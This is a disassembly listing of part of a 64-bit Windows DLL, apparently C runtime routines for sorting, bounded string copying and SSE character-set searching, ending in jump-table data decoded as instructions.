   18000b6b8:	77 16                	ja     0x18000b6d0
   18000b6ba:	48 8b d6             	mov    %rsi,%rdx
   18000b6bd:	48 8b cb             	mov    %rbx,%rcx
   18000b6c0:	49 8b c4             	mov    %r12,%rax
   18000b6c3:	ff 15 9f 4b 00 00    	call   *0x4b9f(%rip)        # 0x180010268
   18000b6c9:	85 c0                	test   %eax,%eax
   18000b6cb:	7e e5                	jle    0x18000b6b2
   18000b6cd:	0f 1f 00             	nopl   (%rax)
   18000b6d0:	48 8b ef             	mov    %rdi,%rbp
   18000b6d3:	49 2b fe             	sub    %r14,%rdi
   18000b6d6:	48 3b fe             	cmp    %rsi,%rdi
   18000b6d9:	76 13                	jbe    0x18000b6ee
   18000b6db:	48 8b d6             	mov    %rsi,%rdx
   18000b6de:	48 8b cf             	mov    %rdi,%rcx
   18000b6e1:	49 8b c4             	mov    %r12,%rax
   18000b6e4:	ff 15 7e 4b 00 00    	call   *0x4b7e(%rip)        # 0x180010268
   18000b6ea:	85 c0                	test   %eax,%eax
   18000b6ec:	7f e2                	jg     0x18000b6d0
   18000b6ee:	48 3b fb             	cmp    %rbx,%rdi
   18000b6f1:	72 38                	jb     0x18000b72b
   18000b6f3:	4d 8b c6             	mov    %r14,%r8
   18000b6f6:	48 8b d7             	mov    %rdi,%rdx
   18000b6f9:	74 1e                	je     0x18000b719
   18000b6fb:	4c 8b cb             	mov    %rbx,%r9
   18000b6fe:	4c 2b cf             	sub    %rdi,%r9
   18000b701:	0f b6 02             	movzbl (%rdx),%eax
   18000b704:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   18000b709:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   18000b70d:	88 0a                	mov    %cl,(%rdx)
   18000b70f:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   18000b713:	49 83 e8 01          	sub    $0x1,%r8
   18000b717:	75 e8                	jne    0x18000b701
   18000b719:	48 3b f7             	cmp    %rdi,%rsi
   18000b71c:	48 8b c3             	mov    %rbx,%rax
   18000b71f:	48 0f 45 c6          	cmovne %rsi,%rax
   18000b723:	48 8b f0             	mov    %rax,%rsi
   18000b726:	e9 65 ff ff ff       	jmp    0x18000b690
   18000b72b:	48 3b f5             	cmp    %rbp,%rsi
   18000b72e:	73 20                	jae    0x18000b750
   18000b730:	49 2b ee             	sub    %r14,%rbp
   18000b733:	48 3b ee             	cmp    %rsi,%rbp
   18000b736:	76 18                	jbe    0x18000b750
   18000b738:	48 8b d6             	mov    %rsi,%rdx
   18000b73b:	48 8b cd             	mov    %rbp,%rcx
   18000b73e:	49 8b c4             	mov    %r12,%rax
   18000b741:	ff 15 21 4b 00 00    	call   *0x4b21(%rip)        # 0x180010268
   18000b747:	85 c0                	test   %eax,%eax
   18000b749:	74 e5                	je     0x18000b730
   18000b74b:	eb 1e                	jmp    0x18000b76b
   18000b74d:	0f 1f 00             	nopl   (%rax)
   18000b750:	49 2b ee             	sub    %r14,%rbp
   18000b753:	49 3b ed             	cmp    %r13,%rbp
   18000b756:	76 13                	jbe    0x18000b76b
   18000b758:	48 8b d6             	mov    %rsi,%rdx
   18000b75b:	48 8b cd             	mov    %rbp,%rcx
   18000b75e:	49 8b c4             	mov    %r12,%rax
   18000b761:	ff 15 01 4b 00 00    	call   *0x4b01(%rip)        # 0x180010268
   18000b767:	85 c0                	test   %eax,%eax
   18000b769:	74 e5                	je     0x18000b750
   18000b76b:	49 8b cf             	mov    %r15,%rcx
   18000b76e:	48 8b c5             	mov    %rbp,%rax
   18000b771:	48 2b cb             	sub    %rbx,%rcx
   18000b774:	49 2b c5             	sub    %r13,%rax
   18000b777:	48 3b c1             	cmp    %rcx,%rax
   18000b77a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   18000b77f:	7c 2b                	jl     0x18000b7ac
   18000b781:	4c 3b ed             	cmp    %rbp,%r13
   18000b784:	73 15                	jae    0x18000b79b
   18000b786:	4c 89 6c cc 30       	mov    %r13,0x30(%rsp,%rcx,8)
   18000b78b:	48 89 ac cc 20 02 00 	mov    %rbp,0x220(%rsp,%rcx,8)
   18000b792:	00 
   18000b793:	48 ff c1             	inc    %rcx
   18000b796:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000b79b:	49 3b df             	cmp    %r15,%rbx
   18000b79e:	0f 83 ff fd ff ff    	jae    0x18000b5a3
   18000b7a4:	4c 8b eb             	mov    %rbx,%r13
   18000b7a7:	e9 74 fd ff ff       	jmp    0x18000b520
   18000b7ac:	49 3b df             	cmp    %r15,%rbx
   18000b7af:	73 15                	jae    0x18000b7c6
   18000b7b1:	48 89 5c cc 30       	mov    %rbx,0x30(%rsp,%rcx,8)
   18000b7b6:	4c 89 bc cc 20 02 00 	mov    %r15,0x220(%rsp,%rcx,8)
   18000b7bd:	00 
   18000b7be:	48 ff c1             	inc    %rcx
   18000b7c1:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000b7c6:	4c 3b ed             	cmp    %rbp,%r13
   18000b7c9:	0f 83 d4 fd ff ff    	jae    0x18000b5a3
   18000b7cf:	4c 8b fd             	mov    %rbp,%r15
   18000b7d2:	e9 49 fd ff ff       	jmp    0x18000b520
   18000b7d7:	48 8b bc 24 30 04 00 	mov    0x430(%rsp),%rdi
   18000b7de:	00 
   18000b7df:	48 8b b4 24 38 04 00 	mov    0x438(%rsp),%rsi
   18000b7e6:	00 
   18000b7e7:	48 8b ac 24 40 04 00 	mov    0x440(%rsp),%rbp
   18000b7ee:	00 
   18000b7ef:	48 8b 9c 24 48 04 00 	mov    0x448(%rsp),%rbx
   18000b7f6:	00 
   18000b7f7:	4c 8b bc 24 28 04 00 	mov    0x428(%rsp),%r15
   18000b7fe:	00 
   18000b7ff:	48 8b 8c 24 10 04 00 	mov    0x410(%rsp),%rcx
   18000b806:	00 
   18000b807:	48 33 cc             	xor    %rsp,%rcx
   18000b80a:	e8 b1 62 ff ff       	call   0x180001ac0
   18000b80f:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   18000b816:	41 5e                	pop    %r14
   18000b818:	41 5d                	pop    %r13
   18000b81a:	41 5c                	pop    %r12
   18000b81c:	c3                   	ret
   18000b81d:	cc                   	int3
   18000b81e:	cc                   	int3
   18000b81f:	cc                   	int3
   18000b820:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b825:	57                   	push   %rdi
   18000b826:	48 83 ec 20          	sub    $0x20,%rsp
   18000b82a:	45 33 d2             	xor    %r10d,%r10d
   18000b82d:	49 8b d8             	mov    %r8,%rbx
   18000b830:	4c 8b da             	mov    %rdx,%r11
   18000b833:	4d 85 c9             	test   %r9,%r9
   18000b836:	75 2c                	jne    0x18000b864
   18000b838:	48 85 c9             	test   %rcx,%rcx
   18000b83b:	75 2c                	jne    0x18000b869
   18000b83d:	48 85 d2             	test   %rdx,%rdx
   18000b840:	74 14                	je     0x18000b856
   18000b842:	e8 b5 c9 ff ff       	call   0x1800081fc
   18000b847:	bb 16 00 00 00       	mov    $0x16,%ebx
   18000b84c:	89 18                	mov    %ebx,(%rax)
   18000b84e:	e8 e9 ad ff ff       	call   0x18000663c
   18000b853:	44 8b d3             	mov    %ebx,%r10d
   18000b856:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000b85b:	41 8b c2             	mov    %r10d,%eax
   18000b85e:	48 83 c4 20          	add    $0x20,%rsp
   18000b862:	5f                   	pop    %rdi
   18000b863:	c3                   	ret
   18000b864:	48 85 c9             	test   %rcx,%rcx
   18000b867:	74 d9                	je     0x18000b842
   18000b869:	4d 85 db             	test   %r11,%r11
   18000b86c:	74 d4                	je     0x18000b842
   18000b86e:	4d 85 c9             	test   %r9,%r9
   18000b871:	75 05                	jne    0x18000b878
   18000b873:	44 88 11             	mov    %r10b,(%rcx)
   18000b876:	eb de                	jmp    0x18000b856
   18000b878:	48 85 db             	test   %rbx,%rbx
   18000b87b:	75 05                	jne    0x18000b882
   18000b87d:	44 88 11             	mov    %r10b,(%rcx)
   18000b880:	eb c0                	jmp    0x18000b842
   18000b882:	48 2b d9             	sub    %rcx,%rbx
   18000b885:	48 8b d1             	mov    %rcx,%rdx
   18000b888:	4d 8b c3             	mov    %r11,%r8
   18000b88b:	49 8b f9             	mov    %r9,%rdi
   18000b88e:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   18000b892:	75 14                	jne    0x18000b8a8
   18000b894:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   18000b897:	88 02                	mov    %al,(%rdx)
   18000b899:	48 ff c2             	inc    %rdx
   18000b89c:	84 c0                	test   %al,%al
   18000b89e:	74 28                	je     0x18000b8c8
   18000b8a0:	49 83 e8 01          	sub    $0x1,%r8
   18000b8a4:	75 ee                	jne    0x18000b894
   18000b8a6:	eb 20                	jmp    0x18000b8c8
   18000b8a8:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   18000b8ab:	88 02                	mov    %al,(%rdx)
   18000b8ad:	48 ff c2             	inc    %rdx
   18000b8b0:	84 c0                	test   %al,%al
   18000b8b2:	74 0c                	je     0x18000b8c0
   18000b8b4:	49 83 e8 01          	sub    $0x1,%r8
   18000b8b8:	74 06                	je     0x18000b8c0
   18000b8ba:	48 83 ef 01          	sub    $0x1,%rdi
   18000b8be:	75 e8                	jne    0x18000b8a8
   18000b8c0:	48 85 ff             	test   %rdi,%rdi
   18000b8c3:	75 03                	jne    0x18000b8c8
   18000b8c5:	44 88 12             	mov    %r10b,(%rdx)
   18000b8c8:	4d 85 c0             	test   %r8,%r8
   18000b8cb:	75 89                	jne    0x18000b856
   18000b8cd:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   18000b8d1:	75 0e                	jne    0x18000b8e1
   18000b8d3:	46 88 54 19 ff       	mov    %r10b,-0x1(%rcx,%r11,1)
   18000b8d8:	45 8d 50 50          	lea    0x50(%r8),%r10d
   18000b8dc:	e9 75 ff ff ff       	jmp    0x18000b856
   18000b8e1:	44 88 11             	mov    %r10b,(%rcx)
   18000b8e4:	e8 13 c9 ff ff       	call   0x1800081fc
   18000b8e9:	bb 22 00 00 00       	mov    $0x22,%ebx
   18000b8ee:	e9 59 ff ff ff       	jmp    0x18000b84c
   18000b8f3:	cc                   	int3
   18000b8f4:	48 83 ec 58          	sub    $0x58,%rsp
   18000b8f8:	48 8b 05 11 e7 00 00 	mov    0xe711(%rip),%rax        # 0x18001a010
   18000b8ff:	48 33 c4             	xor    %rsp,%rax
   18000b902:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   18000b907:	33 c0                	xor    %eax,%eax
   18000b909:	4c 8b ca             	mov    %rdx,%r9
   18000b90c:	48 83 f8 20          	cmp    $0x20,%rax
   18000b910:	4c 8b c1             	mov    %rcx,%r8
   18000b913:	73 77                	jae    0x18000b98c
   18000b915:	c6 44 04 20 00       	movb   $0x0,0x20(%rsp,%rax,1)
   18000b91a:	48 ff c0             	inc    %rax
   18000b91d:	48 83 f8 20          	cmp    $0x20,%rax
   18000b921:	7c f0                	jl     0x18000b913
   18000b923:	8a 02                	mov    (%rdx),%al
   18000b925:	eb 1f                	jmp    0x18000b946
   18000b927:	0f b6 d0             	movzbl %al,%edx
   18000b92a:	48 c1 ea 03          	shr    $0x3,%rdx
   18000b92e:	0f b6 c0             	movzbl %al,%eax
   18000b931:	83 e0 07             	and    $0x7,%eax
   18000b934:	0f b6 4c 14 20       	movzbl 0x20(%rsp,%rdx,1),%ecx
   18000b939:	0f ab c1             	bts    %eax,%ecx
   18000b93c:	49 ff c1             	inc    %r9
   18000b93f:	88 4c 14 20          	mov    %cl,0x20(%rsp,%rdx,1)
   18000b943:	41 8a 01             	mov    (%r9),%al
   18000b946:	84 c0                	test   %al,%al
   18000b948:	75 dd                	jne    0x18000b927
   18000b94a:	eb 1f                	jmp    0x18000b96b
   18000b94c:	41 0f b6 c1          	movzbl %r9b,%eax
   18000b950:	ba 01 00 00 00       	mov    $0x1,%edx
   18000b955:	41 0f b6 c9          	movzbl %r9b,%ecx
   18000b959:	83 e1 07             	and    $0x7,%ecx
   18000b95c:	48 c1 e8 03          	shr    $0x3,%rax
   18000b960:	d3 e2                	shl    %cl,%edx
   18000b962:	84 54 04 20          	test   %dl,0x20(%rsp,%rax,1)
   18000b966:	75 1f                	jne    0x18000b987
   18000b968:	49 ff c0             	inc    %r8
   18000b96b:	45 8a 08             	mov    (%r8),%r9b
   18000b96e:	45 84 c9             	test   %r9b,%r9b
   18000b971:	75 d9                	jne    0x18000b94c
   18000b973:	33 c0                	xor    %eax,%eax
   18000b975:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   18000b97a:	48 33 cc             	xor    %rsp,%rcx
   18000b97d:	e8 3e 61 ff ff       	call   0x180001ac0
   18000b982:	48 83 c4 58          	add    $0x58,%rsp
   18000b986:	c3                   	ret
   18000b987:	49 8b c0             	mov    %r8,%rax
   18000b98a:	eb e9                	jmp    0x18000b975
   18000b98c:	e8 a7 69 ff ff       	call   0x180002338
   18000b991:	cc                   	int3
   18000b992:	cc                   	int3
   18000b993:	cc                   	int3
   18000b994:	cc                   	int3
   18000b995:	cc                   	int3
   18000b996:	cc                   	int3
   18000b997:	cc                   	int3
   18000b998:	cc                   	int3
   18000b999:	cc                   	int3
   18000b99a:	cc                   	int3
   18000b99b:	cc                   	int3
   18000b99c:	cc                   	int3
   18000b99d:	cc                   	int3
   18000b99e:	cc                   	int3
   18000b99f:	cc                   	int3
   18000b9a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b9a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000b9aa:	57                   	push   %rdi
   18000b9ab:	4c 8b d2             	mov    %rdx,%r10
   18000b9ae:	48 8d 35 4b 46 ff ff 	lea    -0xb9b5(%rip),%rsi        # 0x180000000
   18000b9b5:	41 83 e2 0f          	and    $0xf,%r10d
   18000b9b9:	48 8b fa             	mov    %rdx,%rdi
   18000b9bc:	49 2b fa             	sub    %r10,%rdi
   18000b9bf:	48 8b da             	mov    %rdx,%rbx
   18000b9c2:	4c 8b c1             	mov    %rcx,%r8
   18000b9c5:	0f 57 db             	xorps  %xmm3,%xmm3
   18000b9c8:	49 8d 42 ff          	lea    -0x1(%r10),%rax
   18000b9cc:	f3 0f 6f 0f          	movdqu (%rdi),%xmm1
   18000b9d0:	48 83 f8 0e          	cmp    $0xe,%rax
   18000b9d4:	77 73                	ja     0x18000ba49
   18000b9d6:	8b 84 86 ac bc 00 00 	mov    0xbcac(%rsi,%rax,4),%eax
   18000b9dd:	48 03 c6             	add    %rsi,%rax
   18000b9e0:	ff e0                	jmp    *%rax
   18000b9e2:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   18000b9e7:	eb 60                	jmp    0x18000ba49
   18000b9e9:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   18000b9ee:	eb 59                	jmp    0x18000ba49
   18000b9f0:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   18000b9f5:	eb 52                	jmp    0x18000ba49
   18000b9f7:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   18000b9fc:	eb 4b                	jmp    0x18000ba49
   18000b9fe:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   18000ba03:	eb 44                	jmp    0x18000ba49
   18000ba05:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   18000ba0a:	eb 3d                	jmp    0x18000ba49
   18000ba0c:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   18000ba11:	eb 36                	jmp    0x18000ba49
   18000ba13:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   18000ba18:	eb 2f                	jmp    0x18000ba49
   18000ba1a:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   18000ba1f:	eb 28                	jmp    0x18000ba49
   18000ba21:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   18000ba26:	eb 21                	jmp    0x18000ba49
   18000ba28:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   18000ba2d:	eb 1a                	jmp    0x18000ba49
   18000ba2f:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   18000ba34:	eb 13                	jmp    0x18000ba49
   18000ba36:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   18000ba3b:	eb 0c                	jmp    0x18000ba49
   18000ba3d:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   18000ba42:	eb 05                	jmp    0x18000ba49
   18000ba44:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   18000ba49:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000ba4c:	41 b9 0f 00 00 00    	mov    $0xf,%r9d
   18000ba52:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   18000ba56:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   18000ba5a:	85 c0                	test   %eax,%eax
   18000ba5c:	0f 84 33 01 00 00    	je     0x18000bb95
   18000ba62:	0f bc d0             	bsf    %eax,%edx
   18000ba65:	4d 85 d2             	test   %r10,%r10
   18000ba68:	75 06                	jne    0x18000ba70
   18000ba6a:	45 8d 59 f2          	lea    -0xe(%r9),%r11d
   18000ba6e:	eb 14                	jmp    0x18000ba84
   18000ba70:	45 33 db             	xor    %r11d,%r11d
   18000ba73:	8b c2                	mov    %edx,%eax
   18000ba75:	b9 10 00 00 00       	mov    $0x10,%ecx
   18000ba7a:	49 2b ca             	sub    %r10,%rcx
   18000ba7d:	48 3b c1             	cmp    %rcx,%rax
   18000ba80:	41 0f 92 c3          	setb   %r11b
   18000ba84:	41 8b c1             	mov    %r9d,%eax
   18000ba87:	2b c2                	sub    %edx,%eax
   18000ba89:	41 3b c1             	cmp    %r9d,%eax
   18000ba8c:	0f 87 cf 00 00 00    	ja     0x18000bb61
   18000ba92:	8b 8c 86 e8 bc 00 00 	mov    0xbce8(%rsi,%rax,4),%ecx
   18000ba99:	48 03 ce             	add    %rsi,%rcx
   18000ba9c:	ff e1                	jmp    *%rcx
   18000ba9e:	66 0f 73 f9 01       	pslldq $0x1,%xmm1
   18000baa3:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   18000baa8:	e9 b4 00 00 00       	jmp    0x18000bb61
   18000baad:	66 0f 73 f9 02       	pslldq $0x2,%xmm1
   18000bab2:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   18000bab7:	e9 a5 00 00 00       	jmp    0x18000bb61
   18000babc:	66 0f 73 f9 03       	pslldq $0x3,%xmm1
   18000bac1:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   18000bac6:	e9 96 00 00 00       	jmp    0x18000bb61
   18000bacb:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   18000bad0:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   18000bad5:	e9 87 00 00 00       	jmp    0x18000bb61
   18000bada:	66 0f 73 f9 05       	pslldq $0x5,%xmm1
   18000badf:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   18000bae4:	eb 7b                	jmp    0x18000bb61
   18000bae6:	66 0f 73 f9 06       	pslldq $0x6,%xmm1
   18000baeb:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   18000baf0:	eb 6f                	jmp    0x18000bb61
   18000baf2:	66 0f 73 f9 07       	pslldq $0x7,%xmm1
   18000baf7:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   18000bafc:	eb 63                	jmp    0x18000bb61
   18000bafe:	66 0f 73 f9 08       	pslldq $0x8,%xmm1
   18000bb03:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   18000bb08:	eb 57                	jmp    0x18000bb61
   18000bb0a:	66 0f 73 f9 09       	pslldq $0x9,%xmm1
   18000bb0f:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   18000bb14:	eb 4b                	jmp    0x18000bb61
   18000bb16:	66 0f 73 f9 0a       	pslldq $0xa,%xmm1
   18000bb1b:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   18000bb20:	eb 3f                	jmp    0x18000bb61
   18000bb22:	66 0f 73 f9 0b       	pslldq $0xb,%xmm1
   18000bb27:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   18000bb2c:	eb 33                	jmp    0x18000bb61
   18000bb2e:	66 0f 73 f9 0c       	pslldq $0xc,%xmm1
   18000bb33:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   18000bb38:	eb 27                	jmp    0x18000bb61
   18000bb3a:	66 0f 73 f9 0d       	pslldq $0xd,%xmm1
   18000bb3f:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   18000bb44:	eb 1b                	jmp    0x18000bb61
   18000bb46:	66 0f 73 f9 0e       	pslldq $0xe,%xmm1
   18000bb4b:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   18000bb50:	eb 0f                	jmp    0x18000bb61
   18000bb52:	66 0f 73 f9 0f       	pslldq $0xf,%xmm1
   18000bb57:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   18000bb5c:	eb 03                	jmp    0x18000bb61
   18000bb5e:	0f 57 c9             	xorps  %xmm1,%xmm1
   18000bb61:	45 85 db             	test   %r11d,%r11d
   18000bb64:	0f 85 e6 00 00 00    	jne    0x18000bc50
   18000bb6a:	f3 0f 6f 57 10       	movdqu 0x10(%rdi),%xmm2
   18000bb6f:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   18000bb73:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   18000bb77:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   18000bb7b:	85 c0                	test   %eax,%eax
   18000bb7d:	75 35                	jne    0x18000bbb4
   18000bb7f:	48 8b d3             	mov    %rbx,%rdx
   18000bb82:	49 8b c8             	mov    %r8,%rcx
   18000bb85:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   18000bb8a:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   18000bb8f:	5f                   	pop    %rdi
   18000bb90:	e9 5f fd ff ff       	jmp    0x18000b8f4
   18000bb95:	4d 85 d2             	test   %r10,%r10
   18000bb98:	75 d0                	jne    0x18000bb6a
   18000bb9a:	44 38 57 01          	cmp    %r10b,0x1(%rdi)
   18000bb9e:	0f 84 ac 00 00 00    	je     0x18000bc50
   18000bba4:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   18000bba9:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   18000bbae:	5f                   	pop    %rdi
   18000bbaf:	e9 40 fd ff ff       	jmp    0x18000b8f4
   18000bbb4:	0f bc c8             	bsf    %eax,%ecx
   18000bbb7:	8b c1                	mov    %ecx,%eax
   18000bbb9:	49 2b c2             	sub    %r10,%rax
   18000bbbc:	48 83 c0 10          	add    $0x10,%rax
   18000bbc0:	48 83 f8 10          	cmp    $0x10,%rax
   18000bbc4:	77 b9                	ja     0x18000bb7f
   18000bbc6:	44 2b c9             	sub    %ecx,%r9d
   18000bbc9:	41 83 f9 0f          	cmp    $0xf,%r9d
   18000bbcd:	77 79                	ja     0x18000bc48
   18000bbcf:	42 8b 8c 8e 28 bd 00 	mov    0xbd28(%rsi,%r9,4),%ecx
   18000bbd6:	00 
   18000bbd7:	48 03 ce             	add    %rsi,%rcx
   18000bbda:	ff e1                	jmp    *%rcx
   18000bbdc:	66 0f 73 fa 01       	pslldq $0x1,%xmm2
   18000bbe1:	eb 65                	jmp    0x18000bc48
   18000bbe3:	66 0f 73 fa 02       	pslldq $0x2,%xmm2
   18000bbe8:	eb 5e                	jmp    0x18000bc48
   18000bbea:	66 0f 73 fa 03       	pslldq $0x3,%xmm2
   18000bbef:	eb 57                	jmp    0x18000bc48
   18000bbf1:	66 0f 73 fa 04       	pslldq $0x4,%xmm2
   18000bbf6:	eb 50                	jmp    0x18000bc48
   18000bbf8:	66 0f 73 fa 05       	pslldq $0x5,%xmm2
   18000bbfd:	eb 49                	jmp    0x18000bc48
   18000bbff:	66 0f 73 fa 06       	pslldq $0x6,%xmm2
   18000bc04:	eb 42                	jmp    0x18000bc48
   18000bc06:	66 0f 73 fa 07       	pslldq $0x7,%xmm2
   18000bc0b:	eb 3b                	jmp    0x18000bc48
   18000bc0d:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   18000bc12:	eb 34                	jmp    0x18000bc48
   18000bc14:	66 0f 73 fa 09       	pslldq $0x9,%xmm2
   18000bc19:	eb 2d                	jmp    0x18000bc48
   18000bc1b:	66 0f 73 fa 0a       	pslldq $0xa,%xmm2
   18000bc20:	eb 26                	jmp    0x18000bc48
   18000bc22:	66 0f 73 fa 0b       	pslldq $0xb,%xmm2
   18000bc27:	eb 1f                	jmp    0x18000bc48
   18000bc29:	66 0f 73 fa 0c       	pslldq $0xc,%xmm2
   18000bc2e:	eb 18                	jmp    0x18000bc48
   18000bc30:	66 0f 73 fa 0d       	pslldq $0xd,%xmm2
   18000bc35:	eb 11                	jmp    0x18000bc48
   18000bc37:	66 0f 73 fa 0e       	pslldq $0xe,%xmm2
   18000bc3c:	eb 0a                	jmp    0x18000bc48
   18000bc3e:	66 0f 73 fa 0f       	pslldq $0xf,%xmm2
   18000bc43:	eb 03                	jmp    0x18000bc48
   18000bc45:	0f 57 d2             	xorps  %xmm2,%xmm2
   18000bc48:	66 0f eb d1          	por    %xmm1,%xmm2
   18000bc4c:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   18000bc50:	41 0f b6 00          	movzbl (%r8),%eax
   18000bc54:	84 c0                	test   %al,%al
   18000bc56:	74 34                	je     0x18000bc8c
   18000bc58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000bc5f:	00 
   18000bc60:	0f be c0             	movsbl %al,%eax
   18000bc63:	66 0f 6e c0          	movd   %eax,%xmm0
   18000bc67:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   18000bc6b:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   18000bc6f:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   18000bc74:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   18000bc78:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   18000bc7c:	85 c0                	test   %eax,%eax
   18000bc7e:	75 1a                	jne    0x18000bc9a
   18000bc80:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   18000bc85:	49 ff c0             	inc    %r8
   18000bc88:	84 c0                	test   %al,%al
   18000bc8a:	75 d4                	jne    0x18000bc60
   18000bc8c:	33 c0                	xor    %eax,%eax
   18000bc8e:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   18000bc93:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   18000bc98:	5f                   	pop    %rdi
   18000bc99:	c3                   	ret
   18000bc9a:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   18000bc9f:	49 8b c0             	mov    %r8,%rax
   18000bca2:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   18000bca7:	5f                   	pop    %rdi
   18000bca8:	c3                   	ret
   18000bca9:	0f 1f 00             	nopl   (%rax)
   18000bcac:	e2 b9                	loop   0x18000bc67
   18000bcae:	00 00                	add    %al,(%rax)
   18000bcb0:	e9 b9 00 00 f0       	jmp    0x17000bd6e
   18000bcb5:	b9 00 00 f7 b9       	mov    $0xb9f70000,%ecx
   18000bcba:	00 00                	add    %al,(%rax)
   18000bcbc:	fe                   	(bad)
   18000bcbd:	b9 00 00 05 ba       	mov    $0xba050000,%ecx
   18000bcc2:	00 00                	add    %al,(%rax)
   18000bcc4:	0c ba                	or     $0xba,%al
   18000bcc6:	00 00                	add    %al,(%rax)
   18000bcc8:	13 ba 00 00 1a ba    	adc    -0x45e60000(%rdx),%edi
   18000bcce:	00 00                	add    %al,(%rax)
   18000bcd0:	21 ba 00 00 28 ba    	and    %edi,-0x45d80000(%rdx)
   18000bcd6:	00 00                	add    %al,(%rax)
   18000bcd8:	2f                   	(bad)
   18000bcd9:	ba 00 00 36 ba       	mov    $0xba360000,%edx
   18000bcde:	00 00                	add    %al,(%rax)
   18000bce0:	3d ba 00 00 44       	cmp    $0x440000ba,%eax
   18000bce5:	ba 00 00 9e ba       	mov    $0xba9e0000,%edx
   18000bcea:	00 00                	add    %al,(%rax)
   18000bcec:	ad                   	lods   (%rsi),%eax
   18000bced:	ba 00 00 bc ba       	mov    $0xbabc0000,%edx
   18000bcf2:	00 00                	add    %al,(%rax)
   18000bcf4:	cb                   	lret
   18000bcf5:	ba 00 00 da ba       	mov    $0xbada0000,%edx
   18000bcfa:	00 00                	add    %al,(%rax)
   18000bcfc:	e6 ba                	out    %al,$0xba
   18000bcfe:	00 00                	add    %al,(%rax)
   18000bd00:	f2 ba 00 00 fe ba    	repnz mov $0xbafe0000,%edx
   18000bd06:	00 00                	add    %al,(%rax)
   18000bd08:	0a bb 00 00 16 bb    	or     -0x44ea0000(%rbx),%bh
   18000bd0e:	00 00                	add    %al,(%rax)
   18000bd10:	22 bb 00 00 2e bb    	and    -0x44d20000(%rbx),%bh
   18000bd16:	00 00                	add    %al,(%rax)
   18000bd18:	3a bb 00 00 46 bb    	cmp    -0x44ba0000(%rbx),%bh
   18000bd1e:	00 00                	add    %al,(%rax)
   18000bd20:	52                   	push   %rdx
   18000bd21:	bb 00 00 5e bb       	mov    $0xbb5e0000,%ebx
   18000bd26:	00 00                	add    %al,(%rax)
   18000bd28:	dc bb 00 00 e3 bb    	fdivrl -0x441d0000(%rbx)
   18000bd2e:	00 00                	add    %al,(%rax)
   18000bd30:	ea                   	(bad)
   18000bd31:	bb 00 00 f1 bb       	mov    $0xbbf10000,%ebx
   18000bd36:	00 00                	add    %al,(%rax)
   18000bd38:	f8                   	clc
   18000bd39:	bb 00 00 ff bb       	mov    $0xbbff0000,%ebx
   18000bd3e:	00 00                	add    %al,(%rax)
